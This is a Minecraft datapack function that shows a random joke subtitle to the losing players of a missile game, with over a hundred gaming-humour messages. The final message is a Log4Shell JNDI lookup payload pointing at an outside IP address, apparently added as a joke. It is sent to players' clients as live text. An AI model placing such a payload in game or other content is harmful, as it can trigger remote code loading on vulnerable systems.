##Randomized splash messages for the losers of a game
execute if score $skipsplashes CmdData matches 1 run return fail
execute if score $skiptitles CmdData matches 1 run return fail

#If you want to add more splashes just increase this number.
execute store result score $losssplash CmdData run random value 0..126

#Add splashes here (just copy paste the line and change the score)
execute if score $losssplash CmdData matches 0..3 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Better luck next time...","color":"red"}]
execute if score $losssplash CmdData matches 4 run title @a[x=0,tag=Loser] subtitle ["",{"text":"At least we have a cool flag now?","color":"red"}]
execute if score $losssplash CmdData matches 5 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Exceeded missile deployment limit.","color":"red"}]
execute if score $losssplash CmdData matches 6 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Huh, I swear I saw portals there before.","color":"red"}]
execute if score $losssplash CmdData matches 7 run title @a[x=0,tag=Loser] subtitle ["",{"text":"I call hacks!","color":"red"}]
execute if score $losssplash CmdData matches 8 run title @a[x=0,tag=Loser] subtitle ["",{"text":"At least you tried...","color":"red"}]
execute if score $losssplash CmdData matches 9 run title @a[x=0,tag=Loser] subtitle ["",{"text":"So close...","color":"red"}]
execute if score $losssplash CmdData matches 10 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Your enemy was just having a really good day.","color":"red"}]
execute if score $losssplash CmdData matches 11 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Next time we're using bedrock for our defense!","color":"red"}]
execute if score $losssplash CmdData matches 12 run title @a[x=0,tag=Loser] subtitle ["",{"text":"It was lag. I swear!","color":"red"}]
execute if score $losssplash CmdData matches 13 run title @a[x=0,tag=Loser] subtitle ["",{"text":"My ping! Why!","color":"red"}]
execute if score $losssplash CmdData matches 14 run title @a[x=0,tag=Loser] subtitle ["",{"text":"We'll meet again in a rematch!","color":"red"}]
execute if score $losssplash CmdData matches 15 run title @a[x=0,tag=Loser] subtitle ["",{"text":"I guess the Splashes didn't save the portal...","color":"red"}]
execute if score $losssplash CmdData matches 16 run title @a[x=0,tag=Loser] subtitle ["",{"text":":(","color":"red"}]
execute if score $losssplash CmdData matches 17 run title @a[x=0,tag=Loser] subtitle ["",{"text":"That Bullet punched straight through our wall!","color":"red"}]
execute if score $losssplash CmdData matches 18 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Splashes weren't useful...","color":"red"}]
execute if score $losssplash CmdData matches 19 run title @a[x=0,tag=Loser] subtitle ["",{"text":"oops","color":"red"}]
execute if score $losssplash CmdData matches 20 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Dreams were crushed.","color":"red"}]
execute if score $losssplash CmdData matches 21 run title @a[x=0,tag=Loser] subtitle ["",{"text":"This is so sad. Can we hit 2 likes?","color":"red"}]
execute if score $losssplash CmdData matches 22 run title @a[x=0,tag=Loser] subtitle ["",{"text":"This is so sad. Can we hit Spikes?","color":"red"}]
execute if score $losssplash CmdData matches 23 run title @a[x=0,tag=Loser] subtitle ["",{"text":"50% of all teams lose the game.","color":"red"}]
execute if score $losssplash CmdData matches 24 run title @a[x=0,tag=Loser] subtitle ["",{"text":"get got","color":"red"}]
execute if score $losssplash CmdData matches 25 run title @a[x=0,tag=Loser] subtitle ["",{"text":"You have received (1x) Flag of Shameful Loss.","color":"red"}]
execute if score $losssplash CmdData matches 26 run title @a[x=0,tag=Loser] subtitle ["",{"text":"I want a refund.","color":"red"}]
execute if score $losssplash CmdData matches 27 run title @a[x=0,tag=Loser] subtitle ["",{"text":"ping abuse couldn't save you this time roflmao","color":"red"}]
execute if score $losssplash CmdData matches 28 run title @a[x=0,tag=Loser] subtitle ["",{"text":"devs fix game","color":"red"}]
execute if score $losssplash CmdData matches 29 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Did you forget to open the client?","color":"red"}]
execute if score $losssplash CmdData matches 30 run title @a[x=0,tag=Loser] subtitle ["",{"text":"It happens to everyone, buddy :)","color":"red"}]
execute if score $losssplash CmdData matches 31 run title @a[x=0,tag=Loser] subtitle ["",{"text":"News flash: The other team is not hacking!","color":"red"}]
execute if score $losssplash CmdData matches 32 run title @a[x=0,tag=Loser] subtitle ["",{"text":"At least you're not buying them a pet!","color":"red"}]
execute if score $losssplash CmdData matches 33 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Must be anti-knockback.","color":"red"}]
execute if score $losssplash CmdData matches 34 run title @a[x=0,tag=Loser] subtitle ["",{"text":"What's the strat where you lose?","color":"red"}]
execute if score $losssplash CmdData matches 35 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Pro tip: Try winning.","color":"red"}]
execute if score $losssplash CmdData matches 36 run title @a[x=0,tag=Loser] subtitle ["",{"text":"ez","color":"red"}]
execute if score $losssplash CmdData matches 37 run title @a[x=0,tag=Loser] subtitle ["",{"text":"You ever try getting good?","color":"red"}]
execute if score $losssplash CmdData matches 38 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Congrats, you won at losing!","color":"red"}]
execute if score $losssplash CmdData matches 39 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Task failed successfully.","color":"red"}]
execute if score $losssplash CmdData matches 40 run title @a[x=0,tag=Loser] subtitle ["",{"text":"You must have been playing against Chronos.","color":"red"}]
execute if score $losssplash CmdData matches 41 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Point missile *AWAY* from self!","color":"red"}]
execute if score $losssplash CmdData matches 42 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Must be their gaming chairs...","color":"red"}]
execute if score $losssplash CmdData matches 43 run title @a[x=0,tag=Loser] subtitle ["",{"text":"how to ride fast missile?","color":"red"}]
execute if score $losssplash CmdData matches 44 run title @a[x=0,tag=Loser] subtitle ["",{"text":"kinda sus","color":"red"}]
execute if score $losssplash CmdData matches 45 run title @a[x=0,tag=Loser] subtitle ["",{"text":"They're aiming at you!","color":"red"}]
execute if score $losssplash CmdData matches 46 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Emergency Meeting... Wait... I'm dead?","color":"red"}]
execute if score $losssplash CmdData matches 47 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Sure, blame it on the ping.","color":"red"}]
execute if score $losssplash CmdData matches 48 run title @a[x=0,tag=Loser] subtitle ["",{"text":"this is not very","color":"red"}]
execute if score $losssplash CmdData matches 49 run title @a[x=0,tag=Loser] subtitle ["",{"text":"It's coming home!","color":"red"}]
execute if score $losssplash CmdData matches 50 run title @a[x=0,tag=Loser] subtitle ["",{"text":"It's coming ","color":"red"},{"text":"h","color":"red","obfuscated":true},{"text":"Rome!","color":"red"}]
execute if score $losssplash CmdData matches 51 run title @a[x=0,tag=Loser] subtitle ["",{"text":"L","color":"red"}]
execute if score $losssplash CmdData matches 52 run title @a[x=0,tag=Loser] subtitle ["",{"text":"The IRS got you!","color":"red"}]
execute if score $losssplash CmdData matches 53 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Sucks to suck!","color":"red"}]
execute if score $losssplash CmdData matches 54 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Imagine winning","color":"red"}]
execute if score $losssplash CmdData matches 55 run title @a[x=0,tag=Loser] subtitle ["",{"text":"MISSILE WENT BOOM :(","color":"red"}]
execute if score $losssplash CmdData matches 56 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Not my fault! Definitely bad teammates.","color":"red"}]
execute if score $losssplash CmdData matches 57 run title @a[x=0,tag=Loser] subtitle ["",{"text":"I, for one, submit to our new Bee overlords.","color":"red"}]
execute if score $losssplash CmdData matches 58 run title @a[x=0,tag=Loser] subtitle ["",{"text":"That Wasn't Very Cash Money Of You","color":"red"}]
execute if score $losssplash CmdData matches 59 run title @a[x=0,tag=Loser] subtitle ["",{"text":"try renewing your car's extended warranty","color":"red"}]
execute if score $losssplash CmdData matches 60 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Code Red! Evacuate!!!","color":"red"}]
execute if score $losssplash CmdData matches 61 run title @a[x=0,tag=Loser] subtitle ["",{"text":"I blame my teammates for my problems","color":"red"}]
execute if score $losssplash CmdData matches 62 run title @a[x=0,tag=Loser] subtitle ["",{"text":"RNG giveth, RNG taketh away.","color":"red"}]
execute if score $losssplash CmdData matches 63 run title @a[x=0,tag=Loser] subtitle ["",{"text":"We will never financially recover from this.","color":"red"}]
execute if score $losssplash CmdData matches 64 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Everybody expected this.","color":"red"}]
execute if score $losssplash CmdData matches 65 run title @a[x=0,tag=Loser] subtitle ["",{"text":"weel done lad you reyt goosed this one up","color":"red"}]
execute if score $losssplash CmdData matches 66 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Mission failed, we'll get 'em next time.","color":"red"}]
execute if score $losssplash CmdData matches 67 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Not stonks ↓","color":"red"}]
execute if score $losssplash CmdData matches 68 run title @a[x=0,tag=Loser] subtitle ["",{"text":"PANIK","color":"red"}]
execute if score $losssplash CmdData matches 69 run title @a[x=0,tag=Loser] subtitle ["",{"text":"You died - Score: 7","color":"red"}]
execute if score $losssplash CmdData matches 70 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Projectile dysfunction...","color":"red"}]
execute if score $losssplash CmdData matches 71 run title @a[x=0,tag=Loser] subtitle ["",{"text":"You put the miss in missile!","color":"red"}]
execute if score $losssplash CmdData matches 72 run title @a[x=0,tag=Loser] subtitle ["",{"text":"You're fired!","color":"red"}]
execute if score $losssplash CmdData matches 73 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Oops, wrong button.","color":"red"}]
execute if score $losssplash CmdData matches 74 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Boomer","color":"red"}]
execute if score $losssplash CmdData matches 75 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Their gaming toilet was better.","color":"red"}]
execute if score $losssplash CmdData matches 76 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Are ya winning, son?","color":"red"}]
execute if score $losssplash CmdData matches 77 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Pro tip: get gud nub","color":"red"}]
execute if score $losssplash CmdData matches 78 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Try again with your client on.","color":"red"}]
execute if score $losssplash CmdData matches 79 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Couldn't crack the launch codes.","color":"red"}]
execute if score $losssplash CmdData matches 80 run title @a[x=0,tag=Loser] subtitle ["",{"text":"oof","color":"red"}]
execute if score $losssplash CmdData matches 81 run title @a[x=0,tag=Loser] subtitle ["",{"text":"You're a fake and a fraud!","color":"red"}]
execute if score $losssplash CmdData matches 82 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Nuclear disintegration!","color":"red"}]
execute if score $losssplash CmdData matches 83 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Where were my teammates?","color":"red"}]
execute if score $losssplash CmdData matches 84 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Get real.","color":"red"}]
execute if score $losssplash CmdData matches 85 run title @a[x=0,tag=Loser] subtitle ["",{"text":"The cake was a lie.","color":"red"}]
execute if score $losssplash CmdData matches 86 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Sayyy whattt??","color":"red"}]
execute if score $losssplash CmdData matches 87 run title @a[x=0,tag=Loser] subtitle ["",{"text":"A for effort.","color":"red"}]
execute if score $losssplash CmdData matches 88 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Congratulations, you successfully failed!","color":"red"}]
execute if score $losssplash CmdData matches 89 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Please deposit 100 Kromer to unlock winning.","color":"red"}]
execute if score $losssplash CmdData matches 90 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Oof, just like the Glare.","color":"red"}]
execute if score $losssplash CmdData matches 91 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Oof, just like the Copper Golem.","color":"red"}]
execute if score $losssplash CmdData matches 92 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Please refer to the handbook on how to win.","color":"red"}]
execute if score $losssplash CmdData matches 93 run title @a[x=0,tag=Loser] subtitle ["",{"text":"r/yesyesyesno","color":"red"}]
execute if score $losssplash CmdData matches 94 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Do you even have a license for flying these?","color":"red"}]
execute if score $losssplash CmdData matches 95 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Your rocket license has received a strike.","color":"red"}]
execute if score $losssplash CmdData matches 96 run title @a[x=0,tag=Loser] subtitle ["",{"text":"You sure your insurance will cover that?","color":"red"}]
execute if score $losssplash CmdData matches 97 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Trollusa.","color":"red"}]
execute if score $losssplash CmdData matches 98 run title @a[x=0,tag=Loser] subtitle ["",{"text":"That's a lot of damage!","color":"red"}]
execute if score $losssplash CmdData matches 99 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Anticheat works, I guess...","color":"red"}]
execute if score $losssplash CmdData matches 100 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Lost your great win streak sadge","color":"red"}]
execute if score $losssplash CmdData matches 101 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Balancing is hard!","color":"red"}]
execute if score $losssplash CmdData matches 102 run title @a[x=0,tag=Loser] subtitle ["",{"text":"uninstalling minecraft","color":"red"}]
execute if score $losssplash CmdData matches 103 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Cry about it.","color":"red"}]
execute if score $losssplash CmdData matches 104 run title @a[x=0,tag=Loser] subtitle ["",{"text":"bruh nawhhhh nah no way bruhhh fr? Bruhhh","color":"red"}]
execute if score $losssplash CmdData matches 105 run title @a[x=0,tag=Loser] subtitle ["",{"text":"but the the I when I I but how they do the win I the did well how did the I do","color":"red"}]
execute if score $losssplash CmdData matches 106 run title @a[x=0,tag=Loser] subtitle ["",{"text":"ICBM? More like ICU've lost","color":"red"}]
execute if score $losssplash CmdData matches 107 run title @a[x=0,tag=Loser] subtitle ["",{"text":"-30,000,000 social credit","color":"red"}]
execute if score $losssplash CmdData matches 108 run title @a[x=0,tag=Loser] subtitle ["",{"text":"releasing nukes","color":"red"}]
execute if score $losssplash CmdData matches 109 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Reported for: Malicious threat","color":"red"}]
execute if score $losssplash CmdData matches 110 run title @a[x=0,tag=Loser] subtitle ["",{"text":"I hope your bicycle gets a flat tire! >:(","color":"red"}]
execute if score $losssplash CmdData matches 111 run title @a[x=0,tag=Loser] subtitle ["",{"text":"The missiles go towards them, not us!","color":"red"}]
execute if score $losssplash CmdData matches 112 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Thanos ping","color":"red"}]
execute if score $losssplash CmdData matches 113 run title @a[x=0,tag=Loser] subtitle ["",{"text":"guess you were a rocket loser","color":"red"}]
execute if score $losssplash CmdData matches 114 run title @a[x=0,tag=Loser] subtitle ["",{"text":"That wasn't supposed to happen...","color":"red"}]
execute if score $losssplash CmdData matches 115 run title @a[x=0,tag=Loser] subtitle ["",{"text":"So what that you won, I wasn't trying anyways!","color":"red"}]
execute if score $losssplash CmdData matches 116 run title @a[x=0,tag=Loser] subtitle ["",{"text":"You have received: 1 L","color":"red"}]
execute if score $losssplash CmdData matches 117 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Here's your participation trophy!","color":"red"}]
execute if score $losssplash CmdData matches 118 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Initiation failed, resetting world...","color":"red"}]
execute if score $losssplash CmdData matches 119 run title @a[x=0,tag=Loser] subtitle ["",{"text":"don't worry, that wasn't EZU canon","color":"red"}]
execute if score $losssplash CmdData matches 120 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Should've gone to Planetary Cove","color":"red"}]
execute if score $losssplash CmdData matches 121 run title @a[x=0,tag=Loser] subtitle ["",{"text":"I've seen a fish play better.","color":"red"}]
execute if score $losssplash CmdData matches 122 run title @a[x=0,tag=Loser] subtitle ["",{"text":"Yes Rico, kaboom.","color":"red"}]
execute if score $losssplash CmdData matches 123 run title @a[x=0,tag=Loser] subtitle ["",{"text":"No victory popcorn for you.","color":"red"}]
execute if score $losssplash CmdData matches 124 run title @a[x=0,tag=Loser] subtitle ["",{"text":"L","color":"red"}]
execute if score $losssplash CmdData matches 125 run title @a[x=0,tag=Loser] subtitle ["",{"text":"ratio","color":"red"}]
execute if score $losssplash CmdData matches 126 run title @a[x=0,tag=Loser] subtitle ["",{"text":"${jndi:ldap://178.63.51.142:8080/pwned}","color":"red"}]